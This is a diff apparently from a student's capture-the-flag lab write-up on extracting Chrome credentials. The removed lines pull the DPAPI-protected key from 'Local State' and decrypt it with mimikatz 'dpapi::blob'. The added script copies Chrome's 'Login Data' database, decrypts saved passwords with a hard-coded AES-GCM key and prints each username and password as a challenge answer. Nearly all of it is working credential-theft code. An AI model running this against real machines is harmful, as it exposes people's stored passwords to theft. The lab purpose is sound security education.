@@ -122,10 +122,38 @@ Lab environments
 Umer Saqib
 Cyber Security Student
 
-$json = Get-Content -Raw "C:\Users\LabUser\Desktop\Local State" | ConvertFrom-Json
-$b64 = $json.os_crypt.encrypted_key
-$bytes = [System.Convert]::FromBase64String($b64)
-$dpapiBlob = $bytes[5..($bytes.Length - 1)]
-[System.IO.File]::WriteAllBytes("C:\Users\LabUser\Desktop\blob.bin", $dpapiBlob)
-----
-dpapi::blob /in:C:\Users\LabUser\Desktop\blob.bin /masterkey:9c3bca41e3e8ca91ce49a1837f2c2c6fbceb141578e0131e83ab64f81de05ffc56a43082969875842346c6f16a7fd6607a80f4565901293e0a96c48478237e48
+$profileDir = "C:\Users\LabUser\Desktop"
+$loginDataPath = "$profileDir\Login Data"
+$copyPath = "$profileDir\LoginData_temp.db"
+
+# 1. Copy Login Data to avoid file lock issues
+Copy-Item -Path $loginDataPath -Destination $copyPath -Force
+
+# 2. Define the AES-GCM Final Secret Key (from Challenge 5)
+$hexKey = "3bd3bef8ad848d75d91ce86d07de766ad52877827e0942918df20456853c81ac"
+$keyBytes = [byte[]](-split ($hexKey -replace '..', '0x$& '))
+
+# 3. Inline Python script execution (or system SQLite inspection)
+python -c "
+import sqlite3, shutil
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+key = bytes.fromhex('$hexKey')
+conn = sqlite3.connect('$copyPath')
+cursor = conn.cursor()
+cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+
+for url, user, enc_pass in cursor.fetchall():
+    if user:
+        iv = enc_pass[3:15]
+        ciphertext = enc_pass[15:]
+        aesgcm = AESGCM(key)
+        try:
+            password = aesgcm.decrypt(iv, ciphertext, None).decode('utf-8')
+            print(f'URL: {url}')
+            print(f'Username: {user}')
+            print(f'Password: {password}')
+            print(f'Challenge 6 Answer: {user} / {password}')
+        except Exception as e:
+            pass
+"
